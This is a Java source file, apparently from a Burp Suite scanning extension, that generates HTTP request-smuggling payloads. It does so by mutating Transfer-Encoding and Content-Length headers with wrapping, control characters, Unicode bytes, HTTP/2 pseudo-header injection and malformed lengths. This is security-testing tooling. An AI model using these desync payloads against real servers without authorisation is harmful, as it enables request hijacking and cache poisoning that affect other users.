package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;

public class DesyncBox {

    static HashSet<String> supportedPermutations;
    //static final String PERMUTE_PREFIX = "permute: ";
    static SettingsBox sharedPermutations = new SettingsBox();
    static SettingsBox h1Permutations = new SettingsBox();
    static SettingsBox h2Permutations = new SettingsBox();

    static SettingsBox clPermutations = new SettingsBox();
    static SettingsBox sharedSettings = new SettingsBox();
    static SettingsBox h1Settings = new SettingsBox();
    static SettingsBox h2Settings= new SettingsBox();

    DesyncBox () {
        // core techniques
        sharedPermutations.register("vanilla", true);
        sharedPermutations.register("underjoin1", false); // quite a few FP
        sharedPermutations.register("spacejoin1", true);
        sharedPermutations.register("space1", true);
        sharedPermutations.register("nameprefix1", true);
        sharedPermutations.register("nameprefix2", true);
        sharedPermutations.register("valueprefix1", true);
        sharedPermutations.register("vertwrap", true);
        sharedPermutations.register("connection", true);
        sharedPermutations.register("spjunk", true);
        sharedPermutations.register("backslash", true);
        sharedPermutations.register("spaceFF", true);
        sharedPermutations.register("unispace", true);
        sharedPermutations.register("commaCow", true);
        sharedPermutations.register("cowComma", true);
        sharedPermutations.register("contentEnc", true);
        sharedPermutations.register("quoted", true);
        sharedPermutations.register("aposed", true);
        sharedPermutations.register("dualchunk", true);
        sharedPermutations.register("lazygrep", true);
        sharedPermutations.register("0dsuffix", true);
        sharedPermutations.register("tabsuffix", true);
        sharedPermutations.register("revdualchunk", true);
        sharedPermutations.register("nested", true);
        sharedPermutations.register("encode", true);
        sharedPermutations.register("accentTE", true);
        sharedPermutations.register("accentCH", true);
        sharedPermutations.register("removed", true);
        sharedPermutations.register("get", true);
        sharedPermutations.register("options", true);
        sharedPermutations.register("head", true);
        sharedPermutations.register("range", true);
        sharedPermutations.register("qencode", true);
        sharedPermutations.register("qencodeutf", true);
        sharedPermutations.register("nel", true);
        sharedPermutations.register("nbsp", true);
        sharedPermutations.register("shy", true);
        sharedPermutations.register("shy2", true);

        for(int i: DesyncBox.getSpecialChars()) {
            sharedPermutations.register("spacefix1:"+i, true);
        }

        for(int i: DesyncBox.getSpecialChars()) {
            sharedPermutations.register("prefix1:"+i, true);
        }

        for(int i: DesyncBox.getSpecialChars()) {
            sharedPermutations.register("suffix1:"+i, true);
        }

        for(int i: DesyncBox.getSpecialChars()) {
            sharedPermutations.register("namesuffix1:"+i, true);
        }

        h1Permutations.register("nospace1", true);
        h1Permutations.register("linewrapped1", true);
        h1Permutations.register("doublewrapped", true);
        h1Permutations.register("gareth1", true);
        h1Permutations.register("badsetupCR", true);
        h1Permutations.register("badsetupLF", true);
        h1Permutations.register("multiCase", true);
        h1Permutations.register("tabwrap", true);
        h1Permutations.register("UPPERCASE", true);
        h1Permutations.register("0dwrap", true);
        h1Permutations.register("0dspam", true);
        h1Permutations.register("badwrap", true);
        h1Permutations.register("bodysplit", true);
        h1Permutations.register("h1case", true);
        h1Permutations.register("http1.0", true);

        h2Permutations.register("http2hide", true);
        h2Permutations.register("h2colon", true);
        h2Permutations.register("h2auth", true);
        h2Permutations.register("h2path", true);
        h2Permutations.register("http2case", true);
        h2Permutations.register("h2scheme", true);
        h2Permutations.register("h2name", true);
        h2Permutations.register("h2method", true);
        h2Permutations.register("h2space", true);
        h2Permutations.register("h2prefix", true);
        h2Permutations.register("h2CL", true);

        clPermutations.register("CL-plus", true);
        clPermutations.register("CL-minus", true);
        clPermutations.register("CL-pad", true);
        clPermutations.register("CL-bigpad", true);
        clPermutations.register("CL-e", true);
        clPermutations.register("CL-dec", true);
        clPermutations.register("CL-commaprefix", true);
        clPermutations.register("CL-commasuffix", true);
        clPermutations.register("CL-expect", true);
        clPermutations.register("CL-error", true);
        clPermutations.register("CL-spacepad", true);

        supportedPermutations = new HashSet<>();
        supportedPermutations.addAll(sharedPermutations.getSettings());
        supportedPermutations.addAll(h1Permutations.getSettings());
        supportedPermutations.addAll(h2Permutations.getSettings());
        supportedPermutations.addAll(clPermutations.getSettings());
    }

    static byte[] applyDesync(byte[] request, String header, String technique) {
        String headerValue = Utilities.getHeader(request, header);
        header = header + ": ";
        String value = "";
        if(header.equals(("Content-Length: "))) {
            value = Utilities.getHeader(request, "Content-Length");
        } else if (header.equals("Transfer-Encoding: ")) {
             value = "chunked";
        } else {
            throw new RuntimeException("Unsupported target header: "+header);
        }

        String permuted = null;
        byte[] transformed = request;

        
        switch (technique) {
            case "underjoin1":
                permuted = header.replace("-", "_");
                break;
            case "spacejoin1":
                permuted = header.replace("-", " ");
                break;
            case "space1":
                permuted = header.replace(":", " :");
                break;
            case "nameprefix1":
                permuted = "Foo: bar\r\n " + header;
                break;
            case "nameprefix2":
                permuted = "Foo: bar\r\n\t" + header;
                break;
            case "valueprefix1":
                permuted = header + " ";
                break;
            case "nospace1":
                permuted = header.replace(" ", "");
                break;
            case "linewrapped1":
                permuted = header.replace(" ", "\n ");
                break;
            case "doublewrapped":
                permuted = header.replace(" ", "\r\n \r\n ");
                break;
            case "gareth1":
                permuted = header.replace(":", "\n :");
                break;
            case "badsetupCR":
                permuted = "Foo: bar\r"+header;
                break;
            case "badsetupLF":
                permuted = "Foo: bar\n"+header;
                break;
            case "vertwrap":
                permuted = header + "\n\u000B";
                break;
            case "tabwrap":
                permuted = header + "\r\n\t";
                break;
            case "multiCase":
                permuted = header.toUpperCase();
                permuted = permuted.substring(0, 1).toLowerCase() + permuted.substring(1);
                break;
            case "UPPERCASE":
                permuted = header.toUpperCase();
                break;
            case "0dwrap":
                permuted = "Foo: bar\r\n\r"+header;
                break;
            case "0dspam":
                permuted = header.substring(0, 3) + "\r" + header.substring(3);
                break;
            case "connection":
                permuted = "Connection: "+header.split(": ")[0]+"\r\n"+header;
                break;
            case "spjunk":
                // Technique from "HTTP Request Smuggling in 2020"  by Amit Klein
                permuted = header.replace(":", " x:");
                break;
            case "backslash":
                // Technique from "HTTP Request Smuggling in 2020"  by Amit Klein
                permuted = header.replace("-", "\\");
                break;
            case "nel":
                permuted = header.replace(":", "\u0085:");
                break;
            case "nbsp":
                permuted = header.replace(":", "\u00A0:");
                break;
            case "shy2":
                permuted = header.replace(":", "\u00AD:");
                break;
            case "shy":
                permuted = header.replace("-", "\u00AD");
                break;
        }
        

        for (int i: getSpecialChars()) {
            if (technique.equals("spacefix1:"+i)) {
                permuted = header.replace(" ", "") + (char) i;
            }
        }

        for (int i: getSpecialChars()) {
            if (technique.equals("prefix1:"+i)) {
                permuted = header + (char) i;
            }
        }

        for (int i: getSpecialChars()) {
            if (technique.equals("namesuffix1:"+i)) {
                permuted = header.replace(":", (char) i+":");
            }
        }

        if (permuted != null) {
            transformed = Utilities.replace(request, header, permuted);
        }

        if (technique.equals("badwrap")) {
            transformed = Utilities.replace(request, header, "X-Blah-Ignore: ");
            transformed = Utilities.replaceFirst(transformed, "\r\n", "\r\n "+header+headerValue+"\r\n");
        }

        if (technique.equals("spaceFF")) {
            try {
                ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                encoded.write(header.substring(0, header.length()-1).getBytes());
                encoded.write((byte) 0xFF);
                transformed = Utilities.replace(request, header.getBytes(), encoded.toByteArray());
            } catch (IOException e) {

            }
        }
        if (technique.equals("unispace")) {
            try {
                ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                encoded.write(header.substring(0, header.length()-1).getBytes());
                encoded.write((byte) 0xa0);
                transformed = Utilities.replace(request, header.getBytes(), encoded.toByteArray());
            } catch (IOException e) {

            }
        }

        if (technique.equals("http1.0")) {
            transformed = Utilities.replaceFirst(transformed, "HTTP/1.1", "HTTP/1.0");
        }

        switch (technique) {
            case "0dsuffix":
                transformed = Utilities.replace(request, header + value, header + value + "\r");
                break;
            case "tabsuffix":
                transformed = Utilities.replace(request, header + value, header + value + "\t");
                break;
            case "h2auth":
                transformed = Utilities.replace(request, header + value, ":authority: " + Utilities.getHeader(request, "Host") + ":443^~" + header + value + "^~x: x");
                break;
            case "h2path":
                transformed = Utilities.replace(request, header + value, ":path: " + Utilities.getPathFromRequest(request) + " HTTP/1.1^~" + header + value + "^~x: x");
                break;
            case "h2scheme":
                transformed = Utilities.replace(request, header + value, ":scheme: https://" + Utilities.getHeader(request, "Host") + Utilities.getPathFromRequest(request) + " HTTP/1.1^~" + header + value + "^~x: x");
                break;
            case "h2method":
                transformed = Utilities.replace(request, header + value, ":method: POST " + Utilities.getPathFromRequest(request) + " HTTP/1.1^~" + header + value + "^~x: x");
                break;
            case "removed":
                transformed = Utilities.replace(request, header+value, "Nothing-interesting: 1");
                break;
            case "get":
                transformed = Utilities.setMethod(request, "GET");
                break;
            case "options":
                transformed = Utilities.setMethod(request, "OPTIONS");
                break;
            case "head":
                transformed = Utilities.setMethod(request, "HEAD");
                break;
            case "range":
                transformed = Utilities.addOrReplaceHeader(request, "Range", "bytes=0-0");
                break;
            case "h2CL":
                transformed = Utilities.setHeader(request, "Content-Length", "0");
                // we have to bypass the no-effect check
                return transformed;
        }

        for (int i: getSpecialChars()) {
            if (technique.equals("suffix1:"+i)) {
                transformed = Utilities.replace(request, (header+value).getBytes(), (header+value+(char) i).getBytes());
            }
        }

        if (header.equals("Transfer-Encoding: ")) {
            if (technique.equals("commaCow")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: chunked, identity".getBytes());
            } else if (technique.equals("cowComma")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: ".getBytes(), "Transfer-Encoding: identity, ".getBytes());
            } else if (technique.equals("contentEnc")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: ".getBytes(), "Content-Encoding: ".getBytes());
            } else if (technique.equals("quoted")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: \"chunked\"".getBytes());
            } else if (technique.equals("aposed")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked".getBytes(), "Transfer-Encoding: 'chunked'".getBytes());
            } else if (technique.equals("dualchunk")) {
                transformed = Utilities.addOrReplaceHeader(request, "Transfer-encoding", "identity");
            } else if (technique.equals("lazygrep")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: chunk");
            } else if (technique.equals("revdualchunk")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked");
            } else if (technique.equals("bodysplit")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "X: y");
                transformed = Utilities.addOrReplaceHeader(transformed, "Foo", "barzxaazz");
                transformed = Utilities.replace(transformed, "barzxaazz", "barn\n\nTransfer-Encoding: chunked");
            } else if (technique.equals("nested")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: identity, chunked, identity");
            } else if (technique.equals("http2hide")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Foo: b^~Transfer-Encoding: chunked^~x: x");
            } else if (technique.equals("encode")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-%45ncoding: chunked");
            } else if (technique.equals("h2colon")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding`chunked : chunked");
            } else if (technique.equals("http2case")) {
                request = (new String(request)).toLowerCase().getBytes();
                transformed = Utilities.replace(request, header+value, "x-reject: 1\r\ntransfer-Encoding: chunked");
            } else if (technique.equals("h2name")) {
                transformed = Utilities.replace(request, header+value, "Transfer-Encoding`chunked^~xz: x");
            } else if (technique.equals("h2space")) {
                transformed = Utilities.replace(request, header+value, "Transfer-Encoding chunked : chunked");
            } else if (technique.equals("h1case")) {
                transformed = Utilities.replace(request, header+value, header.toUpperCase()+value);
            } else if (technique.equals("h2prefix")) {
                transformed = Utilities.replace(request, header+value, ":transfer-encoding: chunked");
            } else if (technique.equals("qencode")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?=");
            } if (technique.equals("qencodeutf")) {
                transformed = Utilities.replace(request, "Transfer-Encoding: chunked", "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?=");
            }

            if (technique.equals("accentTE")) {
                try {
                    ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                    encoded.write("Transf".getBytes());
                    encoded.write((byte) 0x82);
                    encoded.write("r-Encoding: ".getBytes());
                    transformed = Utilities.replace(request, header.getBytes(), encoded.toByteArray());
                } catch (IOException e) {

                }
            }
            if (technique.equals("accentCH")) {
                try {
                    ByteArrayOutputStream encoded = new ByteArrayOutputStream();
                    encoded.write("Transfer-Encoding: ch".getBytes());
                    encoded.write((byte) 0x96);
                    transformed = Utilities.replace(request, "Transfer-Encoding: chu".getBytes(), encoded.toByteArray());
                } catch (IOException e) {

                }
            }
        }

        if(header.equals(("Content-Length: "))) {
            switch (technique) {
                case "CL-plus":
                    transformed = Utilities.replace(request, "Content-Length: ", "Content-Length: +");
                    break;
                case "CL-minus":
                    transformed = Utilities.replace(request, "Content-Length: ", "Content-Length: -");
                    break;
                case "CL-pad":
                    transformed = Utilities.replace(request, "Content-Length: ", "Content-Length: 0");
                    break;
                case "CL-bigpad":
                    transformed = Utilities.replace(request, "Content-Length: ", "Content-Length: 00000000000");
                    break;
                case "CL-spacepad":
                    transformed = Utilities.replace(request, "Content-Length: ", "Content-Length: 0 ");
                    break;
                case "CL-e":
                    transformed = Utilities.replace(request, "Content-Length: " + value, "Content-Length: " + value + "e0");
                    break;
                case "CL-dec":
                    transformed = Utilities.replace(request, "Content-Length: " + value, "Content-Length: " + value + ".0");
                    break;
                case "CL-commaprefix":
                    transformed = Utilities.replace(request, "Content-Length: ", "Content-Length: 0, ");
                    break;
                case "CL-commasuffix":
                    transformed = Utilities.replace(request, "Content-Length: " + value, "Content-Length: " + value + ", 0");
                    break;
                case "CL-expect":
                    transformed = Utilities.addOrReplaceHeader(request, "Expect", "100-continue");
                    break;
                case "CL-error":
                    transformed =  Utilities.replace(request, "Content-Length: " + value, "X-Invalid Y: \r\nContent-Length: " + value);
            }
        }
        
        if (Arrays.equals(transformed, request) && !technique.equals("vanilla")) {
            if (header.equals("Content-Length: ")) {
                return null;
            }
            Utilities.err("Requested desync technique had no effect: "+technique);
        }

        return transformed;
    }

    static ArrayList<Integer> getSpecialChars() {
        ArrayList<Integer> chars = new ArrayList<>();
//        for (int i=0;i<32;i++) {
//            chars.add(i);
//        }

        chars.add(0); // null
        chars.add(9); // tab
        chars.add(11); // vert tab
        chars.add(12); // form feed
        chars.add(13); // \r
        chars.add(127);
        return chars;
    }
}
